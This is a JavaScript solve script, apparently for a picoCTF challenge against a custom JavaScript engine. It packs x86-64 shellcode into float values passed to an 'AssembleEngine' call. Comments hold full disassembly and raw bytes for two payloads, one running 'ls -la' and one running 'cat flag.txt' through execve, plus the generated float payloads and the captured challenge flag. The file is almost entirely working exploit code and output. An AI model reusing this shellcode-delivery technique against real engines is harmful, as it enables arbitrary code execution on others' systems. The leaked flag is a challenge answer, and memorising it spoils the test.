/*
Converts integers to floats, and vice versa.
Source: https://pwning.tech/2020/09/09/v8-pwn-downunderctf/#toc-heading-4
*/

var buf = new ArrayBuffer(8);
var floatBuf = new Float64Array(buf);
var intBuf = new BigInt64Array(buf);
var shellcode = [0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xDB, 0x53, 0x48, 0xB9, 0x2F, 0x64, 0x65, 0x76, 0x2F, 0x74, 0x74, 0x79, 0x51, 0x54, 0x5F, 0x48, 0xBE, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31, 0xD2, 0x52, 0x48, 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x63, 0x61, 0x74, 0x57, 0x54, 0x5F, 0x52, 0x48, 0xBB, 0x66, 0x6C, 0x61, 0x67, 0x2E, 0x74, 0x78, 0x74, 0x53, 0x48, 0xBB, 0x61, 0x72, 0x67, 0x31, 0x00, 0x00, 0x00, 0x00, 0x53, 0x54, 0x59, 0x48, 0x83, 0xE9, 0x18, 0x48, 0x89, 0xCE, 0x52, 0x48, 0x83, 0xC1, 0x20, 0x51, 0x48, 0x83, 0xE9, 0x08, 0x51, 0x0F, 0x05, 0xC9, 0xC3];

function ftoi(val) {
	floatBuf[0] = val;
	return intBuf[0];
}

function itof(val) {
	intBuf[0] = BigInt(val);
	return floatBuf[0];
}

function bytesToHex(bytes) {
	for (var hex = [], i = 0; i < bytes.length; i++) {
		var current = bytes[i] < 0 ? bytes[i] + 256 : bytes[i];
		hex.push((current >>> 4).toString(16));
		hex.push((current & 0xF).toString(16));
	}
	return hex.join("");
}

// Generate float shellcode
floats = []
while (shellcode.length % 8 != 0) shellcode.push(0);
for (let i = 0; i < shellcode.length; i += 8) {
	// Combine numbers
	intBuf[0] = BigInt(0)
	for (let j = 7; j >= 0; j--) {
		intBuf[0] *= BigInt(256);
		intBuf[0] += BigInt(shellcode[i+j]);
	}
	floats.push(itof(intBuf[0]));
}

// Easy to copy output
exploit = "AssembleEngine([";
for (let i = 0; i < floats.length; i++) {
	exploit += floats[i].toString();
	if (i == floats.length-1) exploit += "]);"
	else exploit += ", ";
}

print(exploit.length);
print(exploit);

// nc mercury.picoctf.net 11433

/*
Runs ls -la

0:  55                      push   rbp
1:  48 89 e5                mov    rbp,rsp
4:  48 81 ec 00 01 00 00    sub    rsp,0x100
b:  48 b8 03 00 00 00 00    movabs rax,0x3
12: 00 00 00
15: 48 bf 00 00 00 00 00    movabs rdi,0x0
1c: 00 00 00
1f: 0f 05                   syscall                        // Closes current stdout stream
21: 48 b8 02 00 00 00 00    movabs rax,0x2
28: 00 00 00
2b: 48 31 db                xor    rbx,rbx
2e: 53                      push   rbx
2f: 48 b9 2f 64 65 76 2f    movabs rcx,0x7974742f7665642f
36: 74 74 79
39: 51                      push   rcx
3a: 54                      push   rsp
3b: 5f                      pop    rdi
3c: 48 be 02 01 00 00 00    movabs rsi,0x102
43: 00 00 00
46: 48 ba 00 00 00 00 00    movabs rdx,0x0
4d: 00 00 00
50: 0f 05                   syscall                        // Opens new stdout stream so stdout is shown
52: 48 b8 3b 00 00 00 00    movabs rax,0x3b                // See https://stackoverflow.com/questions/50305475/exploit-development-gets-and-shellcode
59: 00 00 00
5c: 48 bf 2f 62 69 6e 2f    movabs rdi,0x736c2f6e69622f    // Program name
63: 6c 73 00
66: 57                      push   rdi
67: 54                      push   rsp
68: 5f                      pop    rdi
69: 48 bb 2d 61 6c 00 00    movabs rbx,0x6c612d            // Argument #2
70: 00 00 00
73: 53                      push   rbx
74: 48 bb 61 72 67 31 00    movabs rbx,0x31677261          // Argument #1
7b: 00 00 00
7e: 53                      push   rbx
7f: 54                      push   rsp
80: 59                      pop    rcx
81: 48 83 e9 18             sub    rcx,0x18
85: 48 89 ce                mov    rsi,rcx
88: 48 31 d2                xor    rdx,rdx
8b: 52                      push   rdx
8c: 48 83 c1 20             add    rcx,0x20
90: 51                      push   rcx
91: 48 83 e9 08             sub    rcx,0x8
95: 51                      push   rcx
96: 0f 05                   syscall
98: c9                      leave
99: c3                      ret 

"\x55\x48\x89\xE5\x48\x81\xEC\x00\x01\x00\x00\x48\xB8\x03\x00\x00\x00\x00\x00\x00\x00\x48\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x0F\x05\x48\xB8\x02\x00\x00\x00\x00\x00\x00\x00\x48\x31\xDB\x53\x48\xB9\x2F\x64\x65\x76\x2F\x74\x74\x79\x51\x54\x5F\x48\xBE\x02\x01\x00\x00\x00\x00\x00\x00\x48\xBA\x00\x00\x00\x00\x00\x00\x00\x00\x0F\x05\x48\xB8\x3B\x00\x00\x00\x00\x00\x00\x00\x48\xBF\x2F\x62\x69\x6E\x2F\x6C\x73\x00\x57\x54\x5F\x48\xBB\x2D\x61\x6C\x00\x00\x00\x00\x00\x53\x48\xBB\x61\x72\x67\x31\x00\x00\x00\x00\x53\x54\x59\x48\x83\xE9\x18\x48\x89\xCE\x48\x31\xD2\x52\x48\x83\xC1\x20\x51\x48\x83\xE9\x08\x51\x0F\x05\xC9\xC3"

452
AssembleEngine([3.2473995081498787e-304, 2.0207368043156e-311, 4.454597864731417e-305, 1.9656826079092814e-236, 2.2544953e-316, 2.702688714181715e+40, 9.24940384994055e+252, 8.541226729405237e-304, -6.058451752097371e-28, 0, 1.267252680757e-312, 9.140984431939318e+164, 1.9652585498383564e+98, 5.8875152291447e-310, 9.458750417126387e+242, 1.6233501473037306e+98, -2.1810924798300308e+70, 6.687569716354591e-151, 2.6324971542202547e-284, 2.4763e-319]);
*/

/*
picoCTF{vr00m_vr00m_943e7e61a1bb0159}
Runs cat flag.txt

0:  55                      push   rbp
1:  48 89 e5                mov    rbp,rsp
4:  48 81 ec 00 01 00 00    sub    rsp,0x100
b:  48 b8 03 00 00 00 00    movabs rax,0x3
12: 00 00 00
15: 48 bf 00 00 00 00 00    movabs rdi,0x0
1c: 00 00 00
1f: 0f 05                   syscall
21: 48 b8 02 00 00 00 00    movabs rax,0x2
28: 00 00 00
2b: 48 31 db                xor    rbx,rbx
2e: 53                      push   rbx
2f: 48 b9 2f 64 65 76 2f    movabs rcx,0x7974742f7665642f
36: 74 74 79
39: 51                      push   rcx
3a: 54                      push   rsp
3b: 5f                      pop    rdi
3c: 48 be 02 01 00 00 00    movabs rsi,0x102
43: 00 00 00
46: 48 ba 00 00 00 00 00    movabs rdx,0x0
4d: 00 00 00
50: 0f 05                   syscall
52: 48 31 d2                xor    rdx,rdx
55: 52                      push   rdx
56: 48 b8 3b 00 00 00 00    movabs rax,0x3b
5d: 00 00 00
60: 48 bf 2f 62 69 6e 2f    movabs rdi,0x7461632f6e69622f
67: 63 61 74
6a: 57                      push   rdi
6b: 54                      push   rsp
6c: 5f                      pop    rdi
6d: 52                      push   rdx
6e: 48 bb 66 6c 61 67 2e    movabs rbx,0x7478742e67616c66
75: 74 78 74
78: 53                      push   rbx
79: 48 bb 61 72 67 31 00    movabs rbx,0x31677261
80: 00 00 00
83: 53                      push   rbx
84: 54                      push   rsp
85: 59                      pop    rcx
86: 48 83 e9 18             sub    rcx,0x18
8a: 48 89 ce                mov    rsi,rcx
8d: 52                      push   rdx
8e: 48 83 c1 20             add    rcx,0x20
92: 51                      push   rcx
93: 48 83 e9 08             sub    rcx,0x8
97: 51                      push   rcx
98: 0f 05                   syscall
9a: c9                      leave
9b: c3                      ret

"\x55\x48\x89\xE5\x48\x81\xEC\x00\x01\x00\x00\x48\xB8\x03\x00\x00\x00\x00\x00\x00\x00\x48\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x0F\x05\x48\xB8\x02\x00\x00\x00\x00\x00\x00\x00\x48\x31\xDB\x53\x48\xB9\x2F\x64\x65\x76\x2F\x74\x74\x79\x51\x54\x5F\x48\xBE\x02\x01\x00\x00\x00\x00\x00\x00\x48\xBA\x00\x00\x00\x00\x00\x00\x00\x00\x0F\x05\x48\x31\xD2\x52\x48\xB8\x3B\x00\x00\x00\x00\x00\x00\x00\x48\xBF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x57\x54\x5F\x52\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x53\x48\xBB\x61\x72\x67\x31\x00\x00\x00\x00\x53\x54\x59\x48\x83\xE9\x18\x48\x89\xCE\x52\x48\x83\xC1\x20\x51\x48\x83\xE9\x08\x51\x0F\x05\xC9\xC3"

452
AssembleEngine([3.2473995081498787e-304, 2.0207368043156e-311, 4.454597864731417e-305, 1.9656826079092814e-236, 2.2544953e-316, 2.702688714181715e+40, 9.24940384994055e+252, 8.541226729405237e-304, -6.058451752097371e-28, 0, -1.4296080048573587e-37, 2.9e-322, 5.931026413782796e+169, -4.0236988436339777e-23, 1.1205295609968026e+253, 9.681345909206993e-308, -7.624903286082264e-293, -7.616924522020025e-293, 2.3630897082318174e+82, 1.6228728175e-314]);
*/
